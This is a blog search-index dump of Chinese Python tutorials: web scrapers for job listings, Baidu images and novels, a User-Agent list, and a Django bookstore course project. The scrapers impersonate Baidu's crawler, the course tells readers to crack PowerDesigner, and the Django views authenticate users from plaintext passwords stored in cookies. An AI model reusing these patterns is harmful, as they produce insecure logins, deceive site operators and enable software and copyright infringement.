pass","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Clawer-51job爬取","slug":"Clawer-51job爬取","date":"2020-09-27T02:55:14.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/27/Clawer-51job爬取/","permalink":"http://example.com/2020/09/27/Clawer-51job%E7%88%AC%E5%8F%96/","excerpt":"简单的51job爬取五万条职位信息,正则匹配数据,以及json处理数据","text":"简单的51job爬取五万条职位信息,正则匹配数据,以及json处理数据 Clawer-51job爬取简单的51job爬取五万条职位信息 正则匹配数据 12345678910111213141516171819202122232425262728293031323334import gzip,refrom urllib import requestnum = 0for pn in range(1, 1462): url = &quot;https://search.51job.com/list/000000,000000,0000,00,9,99,java,2,&#123;&#125;.html&quot;.format(pn) headers = &#123; &#x27;user-agent&#x27;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20101101 Firefox/6.0&quot;, &#x27;referer&#x27;: &#x27;url&#x27;&#125; # &#x27;user-agent&#x27;: &quot;baiduSpider&quot;&#125; req = request.Request(url) res = request.urlopen(req).read() try: res = gzip.decompress(res).decode(&#x27;gbk&#x27;) except: res = res.decode(&#x27;gbk&#x27;) jpb_name_rule = &#x27;&quot;job_title&quot;:&quot;(.*?)&quot;&#x27; jpb_conmoany_rule = &#x27;&quot;company_name&quot;:&quot;(.*?)&quot;&#x27; jpb_salary_rule = &#x27;&quot;providesalary_text&quot;:&quot;(.*?)&quot;&#x27; jpb_place_rule = &#x27;&quot;workarea_text&quot;:&quot;(.*?)&quot;&#x27; job_names = re.findall(jpb_name_rule,res) job_company = re.findall(jpb_conmoany_rule,res) job_salary = re.findall(jpb_salary_rule,res) job_place = re.findall(jpb_place_rule,res) with open(&#x27;51job.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as w: for job_name in job_names: index = job_name.index(job_name) w.write(job_name + &quot; &quot; + job_company[index] + &quot; &quot; + job_salary[index]+ &quot; &quot; + job_place[index] + &quot; &quot; + &quot;\\n&quot;) num += 1 if num == 50000: break print(num) json处理数据123456789101112131415import jsonimport refrom urllib import requestfor i in range(1, 6): url = &quot;https://search.51job.com/list/010000,000000,0000,00,9,99,%25E9%2594%2580%25E5%2594%25AE,2,&#123;&#125;.html?lang=c&amp;postchannel=0000&amp;workyear=99&amp;cotype=99&amp;degreefrom=99&amp;jobterm=99&amp;companysize=99&amp;ord_field=0&amp;dibiaoid=0&amp;line=&amp;welfare=&quot;.format( i) res = request.urlopen(url).read().decode(&#x27;gbk&#x27;) # 因为数据存放在script中,json数据 使用json.loads解序列化;json.dumps序列化 rule = &#x27;__SEARCH_RESULT__ = (.*?)&lt;/script&gt;&#x27; job_dict = json.loads(re.findall(rule, res)[0]) for job in job_dict[&#x27;engine_search_result&#x27;]: if not job[&#x27;providesalary_text&#x27;]: job[&#x27;providesalary_text&#x27;] = &quot;面议&quot; print(job[&#x27;job_name&#x27;], job[&#x27;providesalary_text&#x27;])","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"User-Agent常见","slug":"User-Agent常见","date":"2020-09-26T07:47:35.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/09/26/User-Agent常见/","permalink":"http://example.com/2020/09/26/User-Agent%E5%B8%B8%E8%A7%81/","excerpt":"User-Agent常见 Chrome(谷歌) 2) Firefox(火狐) 3) Safari","text":"User-Agent常见 Chrome(谷歌) 2) Firefox(火狐) 3) Safari User-Agent常见12345678910111213141516171819201) Chrome(谷歌)Win7:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1Win10:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36Chrome 17.0 – MACMozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 2) Firefox(火狐)Win7:Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0Firefox 4.0.1 – MACMozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 3) Safari(Safari是苹果计算机的操作系统Mac OS中的浏览器)safari 5.1 – MACMozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Crawler --爬取笔趣阁小说","slug":"Crawler-爬取笔趣阁小说","date":"2020-09-24T07:59:27.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/24/Crawler-爬取笔趣阁小说/","permalink":"http://example.com/2020/09/24/Crawler-%E7%88%AC%E5%8F%96%E7%AC%94%E8%B6%A3%E9%98%81%E5%B0%8F%E8%AF%B4/","excerpt":"crawler–爬取小说","text":"crawler–爬取小说 Crawler –爬取笔趣阁小说123456789101112131415161718192021222324252627282930313233343536373839from lxml import etreefrom urllib import requestimport gzipurl = &quot;http://www.xbiquge.la/xiaoshuodaquan/&quot;result = request.urlopen(url).read()try: res = gzip.decompress(result).decode(&#x27;utf-8&#x27;)except: res = result.decode(&#x27;utf-8&#x27;)ele = etree.HTML(res)book_urls = ele.xpath(&#x27;//div[@id=&quot;main&quot;]//li/a/@href&#x27;)for book_url in book_urls: book_res = request.urlopen(book_url).read() try: book_result = book_res.decode(&#x27;utf-8&#x27;) except: book_result = gzip.decompress(book_res).decode(&#x27;utf-8&#x27;) ele = etree.HTML(book_result) chapter_urls = ele.xpath(&#x27;//div[@id=&quot;list&quot;]/dl/dd/a/@href&#x27;) book_name = ele.xpath(&#x27;//h1/text()&#x27;)[0] print(book_name) new_chapter_urls = [&quot;http://www.xbiquge.la&quot; + url for url in chapter_urls] print(new_chapter_urls) for chapter_url in new_chapter_urls: req = request.Request(chapter_url, headers=&#123;&#x27;user-agent&#x27;: &quot;baiduSpider&quot;&#125;) cha_res = request.urlopen(req).read() try: cha_result = cha_res.decode(&#x27;utf-8&#x27;) except: cha_result = gzip.decompress(cha_res).decode(&#x27;utf-8&#x27;) ele = etree.HTML(cha_result) content = ele.xpath(&#x27;//div[@id=&quot;content&quot;]/text()&#x27;) cha_name = ele.xpath(&#x27;//h1/text()&#x27;)[0] with open(book_name + &quot;.txt&quot;, &quot;a&quot;, encoding=&quot;utf-8&quot;) as w: w.write(cha_name + &quot;\\n&quot;) for cont in content: w.write(cont) w.write(&quot;\\n&quot;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Crawler --爬虫初窥门径","slug":"Crawler-爬虫初窥门径","date":"2020-09-24T01:18:10.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/24/Crawler-爬虫初窥门径/","permalink":"http://example.com/2020/09/24/Crawler-%E7%88%AC%E8%99%AB%E5%88%9D%E7%AA%A5%E9%97%A8%E5%BE%84/","excerpt":"crawler 简单的爬取百度图片,并保存图片","text":"crawler 简单的爬取百度图片,并保存图片 Crawler 爬虫——爬取百度图片123456789101112131415161718192021222324252627282930import urllibfrom urllib import request, parseimport re# keyword = &quot;阿狸&quot;# keyword = urllib.parse.quote(keyword)# print(keyword) #%E9%98%BF%E7%8B%B8url = &quot;https://image.baidu.com/search/index?tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fm=result&amp;fr=&amp;sf=1&amp;fmq=1600852001400_R&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;hd=&amp;latest=&amp;copyright=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;sid=&amp;word=%E9%98%BF%E7%8B%B8&quot;result = request.urlopen(url=url).read().decode(&#x27;utf-8&#x27;)# print(result)# 写入html# with open(&quot;picture.html&quot;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as w:# w.write(result)#正则匹配规则,列表存储符合的图片链接rule = &#x27;&quot;thumbURL&quot;:&quot;(.*?)&quot;&#x27;pic_list = re.findall(rule, result)#遍历列表,然后保存图片a = 1for i in pic_list: print(i) res = request.urlopen(i).read() string = str(a) + &#x27;.jpg&#x27; a = int(a)+1 with open(string, &#x27;wb&#x27;) as w: w.write(res)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Crawler --爬虫爬取百度图片","slug":"Crawler-爬虫爬取百度图片","date":"2020-09-24T01:18:10.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/24/Crawler-爬虫爬取百度图片/","permalink":"http://example.com/2020/09/24/Crawler-%E7%88%AC%E8%99%AB%E7%88%AC%E5%8F%96%E7%99%BE%E5%BA%A6%E5%9B%BE%E7%89%87/","excerpt":"crawler 简单的爬取百度图片,并保存图片 正则匹配爬虫,json格式处理爬取百度图片 使用urlretrieve直接保存图片","text":"crawler 简单的爬取百度图片,并保存图片 正则匹配爬虫,json格式处理爬取百度图片 使用urlretrieve直接保存图片 Crawler 爬虫——爬取百度图片简单的爬取网页图片 12345678910111213141516171819202122232425262728import urllibfrom urllib import request, parseimport re# keyword = &quot;阿狸&quot;# keyword = urllib.parse.quote(keyword)# print(keyword) #%E9%98%BF%E7%8B%B8url = &quot;https://image.baidu.com/search/index?tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fm=result&amp;fr=&amp;sf=1&amp;fmq=1600852001400_R&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;hd=&amp;latest=&amp;copyright=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;sid=&amp;word=%E9%98%BF%E7%8B%B8&quot;result = request.urlopen(url=url).read().decode(&#x27;utf-8&#x27;)# print(result)# 写入html# with open(&quot;picture.html&quot;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as w:# w.write(result)#正则匹配规则,列表存储符合的图片链接rule = &#x27;&quot;thumbURL&quot;:&quot;(.*?)&quot;&#x27;pic_list = re.findall(rule, result)#遍历列表,然后保存图片a = 1for i in pic_list: print(i) res = request.urlopen(i).read() string = str(a) + &#x27;.jpg&#x27; a = int(a)+1 with open(string, &#x27;wb&#x27;) as w: w.write(res) 正则匹配爬虫百度图片搜索使用了ajax请求,所以找到Ajax请求的规律,就可以循环请求下载图片 123456789101112131415from urllib import requestimport rea = 1for pn in range(0, 180, 30): url = &quot;https://image.baidu.com/search/acjson?tn=resultjson_com&amp;logid=6804522630827236065&amp;ipn=rj&amp;ct=201326592&amp;is=&amp;fp=result&amp;queryWord=%E9%98%BF%E7%8B%B8&amp;cl=2&amp;lm=-1&amp;ie=utf-8&amp;oe=utf-8&amp;adpicid=&amp;st=-1&amp;z=&amp;ic=0&amp;hd=&amp;latest=&amp;copyright=&amp;word=%E9%98%BF%E7%8B%B8&amp;s=&amp;se=&amp;tab=&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;qc=&amp;nc=1&amp;fr=&amp;expermode=&amp;force=&amp;pn=&#123;&#125;&amp;rn=30&quot;.format(pn) result = request.urlopen(url).read().decode(&#x27;utf-8&#x27;) rule = &#x27;middleURL&quot;:&quot;(.*?)&quot;&#x27; pic_list = re.findall(rule, result) for i in pic_list: print(i) res = request.urlopen(i).read() with open(&quot;./img/&quot;+str(a) + &quot;.jpg&quot;, &#x27;wb&#x27;) as w: w.write(res) a += 1 json格式处理爬取百度图片 123456789101112131415161718# json格式处理from urllib import requestimport jsona = 1for pn in range(0, 180, 30): url = &quot;https://image.baidu.com/search/acjson?tn=resultjson_com&amp;logid=6804522630827236065&amp;ipn=rj&amp;ct=201326592&amp;is=&amp;fp=result&amp;queryWord=%E9%98%BF%E7%8B%B8&amp;cl=2&amp;lm=-1&amp;ie=utf-8&amp;oe=utf-8&amp;adpicid=&amp;st=-1&amp;z=&amp;ic=0&amp;hd=&amp;latest=&amp;copyright=&amp;word=%E9%98%BF%E7%8B%B8&amp;s=&amp;se=&amp;tab=&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;qc=&amp;nc=1&amp;fr=&amp;expermode=&amp;force=&amp;pn=&#123;&#125;&amp;rn=30&quot;.format( pn) result = request.urlopen(url).read().decode(&#x27;utf-8&#x27;) #生成字符串 new_result = json.loads(result) print(new_result) for data in new_result[&#x27;data&#x27;]: img_url = data[&#x27;middleURL&#x27;] print(img_url) img_res = request.urlopen(img_url).read() with open(&quot;./img/&quot; + str(a) + &quot;.jpg&quot;, &#x27;wb&#x27;) as w: w.write(img_res) a += 1 使用urlretrieve直接保存图片123456789101112131415# _*_coding:UTF-8 _*_from urllib import requestimport jsonnum = 1for page in range(0, 120, 30): url = &quot;https://image.baidu.com/search/acjson?tn=resultjson_com&amp;logid=6804522630827236065&amp;ipn=rj&amp;ct=201326592&amp;is=&amp;fp=result&amp;queryWord=%E9%98%BF%E7%8B%B8&amp;cl=2&amp;lm=-1&amp;ie=utf-8&amp;oe=utf-8&amp;adpicid=&amp;st=-1&amp;z=&amp;ic=0&amp;hd=&amp;latest=&amp;copyright=&amp;word=%E9%98%BF%E7%8B%B8&amp;s=&amp;se=&amp;tab=&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;qc=&amp;nc=1&amp;fr=&amp;expermode=&amp;force=&amp;pn=&#123;&#125;&amp;rn=30&quot;.format( page) res = request.urlopen(url).read().decode(&quot;utf-8&quot;) for data in json.loads(res)[&#x27;data&#x27;]: if data: img_url = data[&#x27;thumbURL&#x27;] # 保存 request.urlretrieve(img_url, filename=&quot;./img/&quot; + str(num) + &quot;.jpg&quot;) num += 1","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Pycharm--当当网项目","slug":"Pycharm-当当网项目","date":"2020-09-22T01:02:37.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/09/22/Pycharm-当当网项目/","permalink":"http://example.com/2020/09/22/Pycharm-%E5%BD%93%E5%BD%93%E7%BD%91%E9%A1%B9%E7%9B%AE/","excerpt":"PyCharm–当当网项目的实现,实现注册登陆,图书分类,详情展示,购物车,订单等功能","text":"PyCharm–当当网项目的实现,实现注册登陆,图书分类,详情展示,购物车,订单等功能 PyCharm–当当网项目的实现一.项目的开发流程(1) 需求分析1明确项目需要实现的功能,不用关心具体实现 (2)库表设计12345表先行涉及的数据有哪些表之间的联系表内需要的字段专用工具实现 (3)详细设计1每一块的功能实现,具体怎么做 (4)编码(5)测试123测试人员测试项目,提交测试文档-bug,bug日清黑白盒测试写测试代码 (6)环境部署1购买云服务器,开发人员或运维做环境部署 (7)项目上线运行(8)运维&#x2F;运营二.库表设计123456781. 安装PowerDesigner并破解2. 找当当网的实体表，表中的字段，表与表之间的联系3. 使用PowerDesigner设计出当当的库表的模型4. 使用PD导出数据库表.sql文件，再导入到Navicat中 - 如果导入失败/出错，检查.sql文件，找到错误，修改PD中的物理模型，再重新导出.sql文件5. 使用Pycharm建好当当网的项目，分好模块，建好app，再生成model类 python manage.py inspectdb 预览model类 python manage.py inspectdb &gt; app名/models.py 三.添加数据,完成图书分类展示模块化设计index模块12345678910111213141516171819# Create your views here.def index(request): time = datetime.now().date() - timedelta(days=3650) # 获取当前时间的上一个时间 cate1 = TCategory.objects.filter(level=1) # 一级标签 cate2 = TCategory.objects.filter(level=2) # 二级标签 booklist1 = TBook.objects.order_by(&quot;-publish_time&quot;)[:10] # 根据上架时间排名 booklist2 = TBook.objects.filter(publish_time__gte=time).order_by(&quot;-sales&quot;) # 根据最新上架时间,销售排名 # 通过cookice判断是否免登陆状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) res = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if res: return render(request, &#x27;index/index.html&#x27;, &#123;&quot;user_name&quot;: user_name, &quot;cates1&quot;: cate1, &quot;cates2&quot;: cate2, &quot;booklist1&quot;: booklist1, &quot;booklist2&quot;: booklist2, &#125;) return render(request, &#x27;index/index.html&#x27;, &#123;&quot;cates1&quot;: cate1, &quot;cates2&quot;: cate2, &quot;booklist1&quot;: booklist1, &quot;booklist2&quot;: booklist2&#125;) index.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;ul class=&quot;slides_container clearfix&quot;&gt; &lt;li &gt; &#123;% for book in booklist1 %&#125; &#123;% if forloop.counter0 &lt; 8 %&#125; &lt;dl class=&quot;clearfix&quot;&gt; &lt;dt&gt;&lt;a class=&quot;img&quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/static/book_pic/&#123;&#123; book.picture &#125;&#125;&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/dt&gt; &lt;dd&gt; &lt;p class=&quot;name&quot; &gt;&lt;a title=&quot;&quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; target=&quot;_blank&quot; style=&quot; &quot;&gt;&#123;&#123; book.book_name &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;author&quot;&gt;&lt;span class=&quot;author_t&quot;&gt;&lt;/span&gt;&#123;&#123; book.author &#125;&#125; 著&lt;/p&gt; &lt;p class=&quot;price&quot;&gt;&lt;span class=&quot;rob&quot;&gt;&lt;span class=&quot;sign&quot;&gt;￥&lt;/span&gt;&lt;span class=&quot;num&quot;&gt;&#123;&#123; book.new_price &#125;&#125;&lt;/span&gt;&lt;span class=&quot;tail&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;price_r&quot;&gt;&lt;span class=&quot;sign&quot;&gt;￥&lt;/span&gt;&lt;span class=&quot;num&quot;&gt;&#123;&#123; book.old_price &#125;&#125;&lt;/span&gt;&lt;span class=&quot;tail&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt; &lt;span style=&quot;background: url(http://img4.ddimg.cn/00035/pic/xsq.png) no-repeat 0px 0px; _background-image: none; _filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&#x27;http://img4.ddimg.cn/00035/pic/xsq.png&#x27;,sizingMethod=&#x27;noscale&#x27;);&quot; class=&quot;product_tags&quot;&gt;&lt;/span&gt;&lt;/dd&gt; &lt;/dl&gt;&#123;% endif %&#125;&#123;% endfor %&#125;&lt;/li&gt;&lt;/ul&gt;&lt;div id=&quot;con_two_1&quot; style=&quot;display:block;&quot; &gt; &lt;ul class=&quot;list01&quot;&gt; &#123;% for book in booklist2 %&#125; &#123;% if forloop.counter &lt; 6 %&#125; &#123;% if forloop.counter == 1 %&#125; &lt;li class=&quot;active&quot;&gt; &lt;span class=&quot;num num1&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% elif forloop.counter &lt;= 3 %&#125; &lt;li &gt;&lt;span class=&quot;num num1&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;li &gt;&lt;span class=&quot;num&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;div&gt; &lt;a class=&quot;list_name&quot; href=&quot;&quot;&gt;&#123;&#123; book.book_name &#125;&#125;&lt;/a&gt; &lt;dl class=&quot;list_con clearfix&quot;&gt; &lt;dt&gt;&lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot;&gt;&lt;img src=&quot;/static/book_pic/&#123;&#123; book.picture &#125;&#125;&quot;&gt;&lt;/a&gt;&lt;/dt&gt; &lt;dd&gt; &lt;p class=&quot;name&quot;&gt;&lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot;&gt;&#123;&#123; book.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;b&gt;￥&#123;&#123; book.new_price &#125;&#125;&lt;/b&gt;&lt;em&gt;￥&#123;&#123; book.old_price &#125;&#125;&lt;/em&gt;&lt;a class=&quot;pl&quot; href=&quot;#&quot;&gt;销售量&#123;&#123; book.sales &#125;&#125;&lt;/a&gt;&lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/ul&gt;&lt;/div&gt;&lt;div id=&quot;con_four_1&quot;&gt; &lt;ul class=&quot;list01&quot;&gt; &#123;% for book in booklist2 %&#125; &#123;% if forloop.counter &lt; 11 %&#125; &#123;% if forloop.counter == 1 %&#125; &lt;li class=&quot;active&quot;&gt; &lt;span class=&quot;num num1&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% elif forloop.counter &lt;= 3 %&#125; &lt;li &gt;&lt;span class=&quot;num num1&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;li &gt;&lt;span class=&quot;num&quot;&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;div&gt; &lt;a class=&quot;list_name&quot; href=&quot;&quot;&gt;&#123;&#123; book.book_name &#125;&#125;&lt;/a&gt; &lt;dl class=&quot;list_con clearfix&quot;&gt; &lt;dt&gt;&lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot;&gt;&lt;img src=&quot;/static/book_pic/&#123;&#123; book.picture &#125;&#125;&quot;&gt;&lt;/a&gt;&lt;/dt&gt; &lt;dd&gt; &lt;p class=&quot;name&quot;&gt;&lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot;&gt;&#123;&#123; book.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;b&gt;￥&#123;&#123; book.new_price &#125;&#125;&lt;/b&gt;&lt;em&gt;￥&#123;&#123; book.old_price &#125;&#125;&lt;/em&gt;&lt;a class=&quot;pl&quot; href=&quot;#&quot;&gt;销售量&#123;&#123; book.sales &#125;&#125;&lt;/a&gt;&lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; &lt;/li&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/ul&gt;&lt;/div&gt; 四.图书的详情和图书列表book模块123456789101112131415161718192021222324252627282930313233343536373839def booklist(request): cate1 = request.GET.get(&quot;cate1&quot;) # 获取一级标签的id cate2 = request.GET.get(&quot;cate2&quot;) # 获取二级标签的id cates1 = TCategory.objects.filter(level=1) # 一级标签 cates2 = TCategory.objects.filter(level=2) # 二级标签 # #根据标签id获取其model对象 # title1 = TCategory.objects.filter(pk=cate1) # title2 = TCategory.objects.filter(pk=cate2)[0] # print(title2.category_id,6545645645646) if cate1 and cate1 != &#x27;None&#x27;: # 获取到属于一级标题下二级标题的所有书籍 paginator = Paginator(TBook.objects.filter(category__parent_id=cate1), per_page=3) else: paginator = Paginator(TBook.objects.filter(category_id=cate2), per_page=3) # 实现分页 num = request.GET.get(&quot;num&quot;, 1) page = paginator.page(num) # 通过cookice判断是否免登陆状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) res = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if res: return render(request, &#x27;book/booklist.html&#x27;, &#123;&quot;user_name&quot;:user_name,&quot;cates1&quot;: cates1, &quot;cates2&quot;: cates2,&quot;page&quot;: page,&quot;cate1&quot;:cate1,&quot;cate2&quot;:cate2&#125;) return render(request, &#x27;book/booklist.html&#x27;, &#123;&quot;cates1&quot;: cates1, &quot;cates2&quot;: cates2,&quot;page&quot;: page,&quot;cate1&quot;:cate1,&quot;cate2&quot;:cate2&#125;)def bookdetails(request): id = request.GET.get(&quot;id&quot;) # 获取前端返回的图书id book = TBook.objects.filter(pk=id)[0] # 根据id查询到书的信息 # discount 折扣计算返回给前端 discount = round((book.new_price / book.old_price * 10), 2) # 通过cookice判断是否免登陆状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) res = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if res: return render(request, &#x27;book/bookdetails.html&#x27;, &#123;&quot;user_name&quot;:user_name,&quot;book&quot;: book, &quot;discount&quot;: discount&#125;) return render(request, &#x27;book/bookdetails.html&#x27;, &#123;&quot;book&quot;: book, &quot;discount&quot;: discount&#125;) booklist.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899&lt;div class=&quot;con flq_body&quot; &gt; &#123;% for cate1 in cates1 %&#125; &lt;div class=&quot;level_one&quot; &gt; &lt;dl class=&quot;con primary_dl&quot; &gt; &lt;dt class=&quot;con &quot; name=&quot;m403752_pid5367_t10276&quot;&gt;&lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?cate1=&#123;&#123; cate1.id &#125;&#125;&quot;&gt;&lt;span&gt;&#123;&#123; cate1.category_id &#125;&#125;&lt;/span&gt;&lt;/a&gt;&lt;/dt&gt; &lt;dd class=&quot;con sec_cate dd_level1&quot; &gt; &#123;% for cate2 in cates2 %&#125; &#123;% if cate2.parent_id == cate1.id %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?cate2=&#123;&#123; cate2.id &#125;&#125;&quot; target=&quot;_blank&quot; title=&quot;&#123;&#123; cate2.category_id &#125;&#125;&quot; class=&quot;title1&quot; &gt; &#123;&#123; cate2.category_id &#125;&#125; &lt;/a&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; &#123;% endfor %&#125;&lt;/div&gt;&lt;div class=&quot;data&quot; name=&quot;Fy&quot;&gt;共&lt;span&gt;&#123;&#123; page.paginator.count &#125;&#125;&lt;/span&gt;个商品 &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot; class=&quot;arrow_l arrow_l_on&quot;&gt;&lt;/a&gt; &#123;% else %&#125; &lt;a class=&quot;arrow_l &quot;&gt;&lt;/a&gt; &#123;% endif %&#125; &lt;span class=&quot;or&quot;&gt;&#123;&#123; page.number &#125;&#125;&lt;/span&gt; &lt;span&gt;/&#123;&#123; page.paginator.num_pages &#125;&#125;&lt;/span&gt; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot; class=&quot;arrow_r arrow_r_on&quot;&gt;&lt;/a&gt; &#123;% else %&#125; &lt;a class=&quot;arrow_r &quot; &gt;&lt;/a&gt; &#123;% endif %&#125;&lt;/div&gt;&#123;% for book in page.object_list %&#125;&lt;li class=&quot;line1&quot; id=&quot;23668351&quot;&gt; &lt;div class=&quot;inner&quot;&gt; &lt;a title=&quot; &#123;&#123; book.book_name &#125;&#125; &quot; class=&quot;pic&quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/static/book_pic/&#123;&#123; book.picture &#125;&#125;&quot; alt=&quot; &#123;&#123; book.book_name &#125;&#125; &quot;&gt;&lt;/a&gt; &lt;p class=&quot;name&quot;&gt;&lt;a title=&quot; &#123;&#123; book.book_name &#125;&#125; &quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; target=&quot;_blank&quot;&gt; &#123;&#123; book.book_name &#125;&#125; &lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;star&quot;&gt;&lt;span class=&quot;level&quot;&gt;&lt;span style=&quot;width: 100%;&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; target=&quot;_blank&quot; name=&quot;P_pl&quot;&gt;&#123;&#123; book.sales &#125;&#125;销售量&lt;/a&gt;&lt;/p&gt; &lt;div class=&quot;publisher_info&quot;&gt; &lt;p class=&quot;author&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; name=&quot;P_zz&quot; title=&quot;&#123;&#123; book.author &#125;&#125;&quot;&gt;&#123;&#123; book.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;publishing_time&quot;&gt;&lt;span&gt;&lt;/span&gt;/ &#123;&#123; book.publish_time &#125;&#125; &lt;/p&gt; &lt;p class=&quot;publishing&quot;&gt;&lt;span&gt;&lt;/span&gt;/ &lt;a href=&quot;#&quot; name=&quot;P_cbs&quot; title=&quot;&#123;&#123; book.publish 